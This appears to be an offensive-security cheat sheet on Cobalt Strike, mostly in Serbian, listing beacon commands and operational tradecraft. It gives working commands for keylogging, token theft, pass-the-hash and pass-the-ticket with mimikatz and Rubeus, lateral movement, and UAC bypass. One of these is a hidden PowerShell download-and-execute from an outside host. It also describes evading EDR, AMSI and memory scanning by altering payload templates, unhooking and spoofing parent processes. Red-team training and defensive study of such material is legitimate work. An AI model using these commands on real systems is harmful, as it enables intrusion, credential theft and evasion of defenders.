# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` zatim možete odabrati gde da slušate, koju vrstu beacon-a da koristite (http, dns, smb...) i još mnogo toga.

### Peer2Peer Listeners

Beaconi ovih slušalaca ne moraju direktno da komuniciraju sa C2, mogu da komuniciraju preko drugih beacon-a.

`Cobalt Strike -> Listeners -> Add/Edit` zatim treba da odaberete TCP ili SMB beacone

* **TCP beacon će postaviti slušalac na odabranom portu**. Da biste se povezali na TCP beacon, koristite komandu `connect <ip> <port>` iz drugog beacon-a
* **smb beacon će slušati na pipename-u sa odabranim imenom**. Da biste se povezali na SMB beacon, morate koristiti komandu `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** za HTA datoteke
* **`MS Office Macro`** za kancelarijski dokument sa makroom
* **`Windows Executable`** za .exe, .dll ili servis .exe
* **`Windows Executable (S)`** za **stageless** .exe, .dll ili servis .exe (bolje stageless nego staged, manje IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Ovo će generisati skriptu/izvršni fajl za preuzimanje beacon-a iz cobalt strike u formatima kao što su: bitsadmin, exe, powershell i python

#### Host Payloads

Ako već imate datoteku koju želite da hostujete na web serveru, samo idite na `Attacks -> Web Drive-by -> Host File` i odaberite datoteku za hostovanje i konfiguraciju web servera.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Izvrši lokalni .NET binarni fajl
execute-assembly </path/to/executable.exe>
# Imajte na umu da da biste učitali skupove veće od 1MB, svojstvo 'tasks_max_size' profila treba modifikovati.

# Screenshots
printscreen    # Napravite jedan screenshot putem PrintScr metode
screenshot     # Napravite jedan screenshot
screenwatch    # Pravite periodične screenshot-ove desktop-a
## Idite na View -> Screenshots da ih vidite

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes da vidite pritisnute tastere

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Umetnite portscan akciju unutar drugog procesa
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Uvezi Powershell modul
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <samo napišite powershell cmd ovde> # Ovo koristi najvišu podržanu verziju powershell-a (ne oppsec)
powerpick <cmdlet> <args> # Ovo kreira žrtveni proces specificiran od strane spawnto, i injektuje UnmanagedPowerShell u njega za bolji opsec (bez logovanja)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # Ovo injektuje UnmanagedPowerShell u specificirani proces da izvrši PowerShell cmdlet.


# User impersonation
## Generisanje tokena sa kredencijalima
make_token [DOMAIN\user] [password] #Kreirajte token da se pretvarate da ste korisnik u mreži
ls \\computer_name\c$ # Pokušajte da koristite generisani token za pristup C$ na računaru
rev2self # Prestanite da koristite token generisan sa make_token
## Korišćenje make_token generiše događaj 4624: Račun je uspešno prijavljen. Ovaj događaj je veoma čest u Windows domenima, ali se može suziti filtriranjem po tipu prijavljivanja. Kao što je pomenuto, koristi LOGON32_LOGON_NEW_CREDENTIALS koji je tip 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Ukradi token iz pid
## Kao make_token ali krade token iz procesa
steal_token [pid] # Takođe, ovo je korisno za mrežne akcije, ne lokalne akcije
## Iz API dokumentacije znamo da ovaj tip prijavljivanja "omogućava pozivaocu da klonira svoj trenutni token". Zato izlaz Beacon-a kaže Impersonated <current_username> - pretvara se u naš vlastiti klonirani token.
ls \\computer_name\c$ # Pokušajte da koristite generisani token za pristup C$ na računaru
rev2self # Prestanite da koristite token iz steal_token

## Pokreni proces sa novim kredencijalima
spawnas [domain\username] [password] [listener] #Uradite to iz direktorijuma sa pristupom za čitanje kao: cd C:\
## Kao make_token, ovo će generisati Windows događaj 4624: Račun je uspešno prijavljen, ali sa tipom prijavljivanja 2 (LOGON32_LOGON_INTERACTIVE). Detaljno će prikazati korisnika koji poziva (TargetUserName) i korisnika koji se pretvara (TargetOutboundUserName).

## Injektuj u proces
inject [pid] [x64|x86] [listener]
## Iz OpSec tačke gledišta: Ne vršite međusobnu injekciju osim ako zaista ne morate (npr. x86 -> x64 ili x64 -> x86).

## Pass the hash
## Ovaj proces modifikacije zahteva patch-ovanje LSASS memorije što je visoko rizična akcija, zahteva lokalne administratorske privilegije i nije uvek izvodljivo ako je omogućena Protected Process Light (PPL).
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash kroz mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Bez /run, mimikatz pokreće cmd.exe, ako se pokrećete kao korisnik sa Desktop-om, videće shell (ako se pokrećete kao SYSTEM, možete slobodno nastaviti)
steal_token <pid> #Ukradi token iz procesa koji je kreirao mimikatz

## Pass the ticket
## Zatraži tiket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Kreirajte novu sesiju prijavljivanja za korišćenje sa novim tiketom (da ne prepišete kompromitovani)
make_token <domain>\<username> DummyPass
## Napišite tiket na mašini napadača iz powershell sesije i učitajte ga
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket iz SYSTEM
## Generišite novi proces sa tiketom
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Ukradi token iz tog procesa
steal_token <pid>

## Ekstraktuj tiket + Pass the ticket
### Lista tiketa
execute-assembly C:\path\Rubeus.exe triage
### Dump-uj zanimljiv tiket po luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Kreirajte novu sesiju prijavljivanja, zabeležite luid i processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Umetnite tiket u generisanu sesiju prijavljivanja
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Na kraju, ukradite token iz tog novog procesa
steal_token <pid>

# Lateral Movement
## Ako je token kreiran, biće korišćen
jump [method] [target] [listener]
## Metode:
## psexec                    x86   Koristite servis za pokretanje Service EXE artefakta
## psexec64                  x64   Koristite servis za pokretanje Service EXE artefakta
## psexec_psh                x86   Koristite servis za pokretanje PowerShell one-liner-a
## winrm                     x86   Pokrenite PowerShell skriptu putem WinRM
## winrm64                   x64   Pokrenite PowerShell skriptu putem WinRM
## wmi_msbuild               x64   wmi lateral movement sa msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec ne vraća izlaz
## Metode:
## psexec                          Daljinsko izvršavanje putem Service Control Manager-a
## winrm                           Daljinsko izvršavanje putem WinRM (PowerShell)
## wmi                             Daljinsko izvršavanje putem WMI

## Da biste izvršili beacon sa wmi (nije u jump komandi) samo otpremite beacon i izvršite ga
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## Na metaploit hostu
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Na cobalt: Listeners > Add i postavite Payload na Foreign HTTP. Postavite Host na 10.10.5.120, Port na 8080 i kliknite na Save.
beacon> spawn metasploit
## Možete samo pokrenuti x86 Meterpreter sesije sa stranim slušateljem.

# Pass session to Metasploit - Through shellcode injection
## Na metasploit hostu
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Pokrenite msfvenom i pripremite multi/handler slušalac

## Kopirajte bin fajl na cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Injektujte metasploit shellcode u x64 proces

# Pass metasploit session to cobalt strike
## Generišite stageless Beacon shellcode, idite na Attacks > Packages > Windows Executable (S), odaberite željeni slušalac, odaberite Raw kao tip izlaza i odaberite Use x64 payload.
## Koristite post/windows/manage/shellcode_inject u metaspolitu da injektujete generisani cobalt strike shellcode


# Pivoting
## Otvorite socks proxy u teamserveru
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Opsec

### Execute-Assembly

**`execute-assembly`** koristi **žrtveni proces** koristeći daljinsku injekciju procesa za izvršavanje naznačenog programa. Ovo je veoma bučno jer se za injekciju unutar procesa koriste određeni Win API-ji koje svaki EDR proverava. Međutim, postoje neki prilagođeni alati koji se mogu koristiti za učitavanje nečega u istom procesu:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- U Cobalt Strike možete takođe koristiti BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

Agresor skript `https://github.com/outflanknl/HelpColor` će kreirati komandu `helpx` u Cobalt Strike koja će obojiti komande označavajući da li su BOFs (zelene), da li su Frok&Run (žute) i slično, ili da li su ProcessExecution, injekcija ili slično (crvene). Što pomaže da se zna koje su komande manje uočljive.

### Act as the user

Možete proveriti događaje kao što su `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Proverite sve interaktivne prijave da biste znali uobičajene radne sate.
- System EID 12,13 - Proverite učestalost gašenja/pokretanja/spavanja.
- Security EID 4624/4625 - Proverite dolazne validne/invalidne NTLM pokušaje.
- Security EID 4648 - Ovaj događaj se kreira kada se koristi plaintext kredencijal za prijavu. Ako ga je proces generisao, binarni fajl potencijalno ima kredencijale u čistom tekstu u konfiguracionom fajlu ili unutar koda.

Kada koristite `jump` iz cobalt strike, bolje je koristiti `wmi_msbuild` metodu da novi proces izgleda legitimnije.

### Use computer accounts

Uobičajeno je da odbrambeni timovi proveravaju čudna ponašanja generisana od korisnika i **isključuju servisne naloge i račune računara kao `*$` iz svog nadzora**. Možete koristiti ove račune za obavljanje lateralnog kretanja ili eskalaciju privilegija.

### Use stageless payloads

Stageless payloads su manje bučni od staged jer ne moraju da preuzmu drugu fazu sa C2 servera. To znači da ne generišu nikakav mrežni saobraćaj nakon inicijalne veze, što ih čini manje verovatnim za otkrivanje od strane mrežnih odbrana.

### Tokens & Token Store

Budite oprezni kada kradete ili generišete tokene jer može biti moguće da EDR enumeriše sve tokene svih niti i pronađe **token koji pripada drugom korisniku** ili čak SYSTEM-u u procesu.

Ovo omogućava čuvanje tokena **po beacon-u** tako da nije potrebno ponovo krasti isti token iznova i iznova. Ovo je korisno za lateralno kretanje ili kada trebate koristiti ukradeni token više puta:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Kada se krećete lateralno, obično je bolje **ukrasti token nego generisati novi** ili izvršiti napad pass the hash.

### Guardrails

Cobalt Strike ima funkciju pod nazivom **Guardrails** koja pomaže u sprečavanju korišćenja određenih komandi ili akcija koje bi mogle biti otkrivene od strane odbrane. Guardrails se mogu konfigurisati da blokiraju specifične komande, kao što su `make_token`, `jump`, `remote-exec`, i druge koje se obično koriste za lateralno kretanje ili eskalaciju privilegija.

Pored toga, repozitorij [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) takođe sadrži neke provere i ideje koje možete razmotriti pre nego što izvršite payload.

### Tickets encryption

U AD budite oprezni sa enkripcijom tiketa. Po defaultu, neki alati će koristiti RC4 enkripciju za Kerberos tikete, koja je manje sigurna od AES enkripcije, a po defaultu ažurirana okruženja će koristiti AES. Ovo može biti otkriveno od strane odbrane koja prati slabe enkripcijske algoritme.

### Avoid Defaults

Kada koristite Cobalt Strike, po defaultu SMB cevi će imati ime `msagent_####` i `"status_####`. Promenite ta imena. Moguće je proveriti imena postojećih cevi iz Cobalt Strike sa komandom: `ls \\.\pipe\`

Pored toga, sa SSH sesijama kreira se cev pod nazivom `\\.\pipe\postex_ssh_####`. Promenite je sa `set ssh_pipename "<new_name>";`.

Takođe, u post-exploitation napadu cevi `\\.\pipe\postex_####` mogu biti modifikovane sa `set pipename "<new_name>"`.

U Cobalt Strike profilima takođe možete modifikovati stvari kao što su:

- Izbegavanje korišćenja `rwx`
- Kako funkcioniše ponašanje injekcije procesa (koji API-ji će biti korišćeni) u `process-inject {...}` bloku
- Kako "fork and run" funkcioniše u `post-ex {…}` bloku
- Vreme spavanja
- Maksimalna veličina binarnih fajlova koji će biti učitani u memoriju
- Memorijski otisak i DLL sadržaj sa `stage {...}` blokom
- Mrežni saobraćaj

### Bypass memory scanning

Neki EDR-ovi skeniraju memoriju za neke poznate malware potpise. Cobalt Strike omogućava modifikaciju funkcije `sleep_mask` kao BOF koja će moći da enkriptuje u memoriji backdoor.

### Noisy proc injections

Kada injektujete kod u proces, ovo je obično veoma bučno, jer **ni jedan regularan proces obično ne vrši ovu akciju i zato su načini za to veoma ograničeni**. Stoga, može biti otkriveno od strane sistema za detekciju zasnovanih na ponašanju. Štaviše, može biti otkriveno i od strane EDR-ova koji skeniraju mrežu za **niti koje sadrže kod koji nije na disku** (iako procesi kao što su pregledači koji koriste JIT to obično imaju). Primer: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Kada pokrećete novi proces, važno je **održati regularan odnos roditelj-dete** između procesa kako biste izbegli otkrivanje. Ako svchost.exec izvršava iexplorer.exe, to će izgledati sumnjivo, jer svchost.exe nije roditelj iexplorer.exe u normalnom Windows okruženju.

Kada se novi beacon pokrene u Cobalt Strike, po defaultu se kreira proces koji koristi **`rundll32.exe`** da pokrene novog slušatelja. Ovo nije veoma stealthy i može biti lako otkriveno od strane EDR-ova. Pored toga, `rundll32.exe` se pokreće bez argumenata, što ga čini još sumnjivijim.

Sa sledećom Cobalt Strike komandom, možete odrediti drugačiji proces za pokretanje novog beacona, čineći ga manje uočljivim:
```bash
spawnto x86 svchost.exe
```
Možete takođe promeniti ovu postavku **`spawnto_x86` i `spawnto_x64`** u profilu.

### Proksiranje saobraćaja napadača

Napadači ponekad će morati da budu u mogućnosti da pokreću alate lokalno, čak i na linux mašinama i da omoguće da saobraćaj žrtava dođe do alata (npr. NTLM relay).

Štaviše, ponekad je za napadača stealthier da **doda ovaj hash ili tiket u svoj vlastiti LSASS proces** lokalno i zatim se prebacuje iz njega umesto da modifikuje LSASS proces žrtvinske mašine.

Međutim, morate biti **oprezni sa generisanim saobraćajem**, jer možda šaljete neobičan saobraćaj (kerberos?) iz vašeg backdoor procesa. Za ovo biste mogli da se prebacite na proces pregledača (iako biste mogli biti uhvaćeni ako se injektujete u proces, pa razmislite o stealth načinu da to uradite).
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> Promenite lozinku  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# Promenite powershell  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# Promenite $var_code -> $polop  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#artifact kit  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
